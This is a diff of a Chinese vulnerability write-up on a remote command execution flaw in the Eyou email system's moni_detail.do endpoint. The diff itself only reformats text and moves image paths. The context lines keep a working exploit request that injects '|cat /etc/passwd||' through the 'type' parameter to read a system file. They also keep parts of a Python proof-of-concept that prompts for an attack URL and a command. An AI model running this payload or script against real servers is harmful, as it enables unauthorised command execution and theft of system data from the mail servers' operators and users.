@@ -1,4 +1,4 @@
-# 亿邮电子邮件系统 moni_detail.do 远程命令执行漏洞
+# 亿邮电子邮件系统 moni\_detail.do 远程命令执行漏洞
 
 ## 漏洞描述
 
@@ -20,17 +20,11 @@ body="亿邮电子邮件系统"
 
 登录页面如下
 
-
-
-![](images/202202091831652.png)
-
-
+![](../.gitbook/assets/202202091831652.png)
 
 漏洞请求包如下
 
-
-
-```plain
+```
 POST /webadm/?q=moni_detail.do&action=gragh HTTP/1.1
 Host: xxx.xxx.xxx.xxx
 Content-Length: 39
@@ -42,11 +36,9 @@ User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,
 type='|cat /etc/passwd||'
 ```
 
-![](images/202202091831783.png)
+![](../.gitbook/assets/202202091831783.png)
 
 ## 漏洞POC
-
-
 
 ```python
 import requests
@@ -110,4 +102,3 @@ if __name__ == '__main__':
     target_url = str(input("\033[35mPlease input Attack Url\nUrl >>> \033[0m"))
     POC_1(target_url, cmd)
 ```
-
